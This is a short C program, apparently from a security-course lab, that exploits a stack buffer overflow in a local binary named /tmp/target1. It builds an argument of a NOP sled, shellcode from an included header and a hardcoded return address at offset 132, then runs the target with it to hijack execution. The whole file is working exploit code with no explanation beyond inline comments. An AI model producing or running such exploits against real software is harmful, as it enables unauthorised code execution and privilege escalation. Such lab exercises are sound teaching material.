#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  args[1] = malloc(137);
  memset(args[1], 0x90, 136); // 0x90 is NOP in x86 assembly. We cannot leave nulls in our string.
  args[1][136] = '\0'; // NULL terminate the string.
  memcpy(args[1], shellcode, strlen(shellcode)); // shellcode provided in shellcode.h

  *(unsigned int *)(args[1] + 132) = 0xbffffd78;
  
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
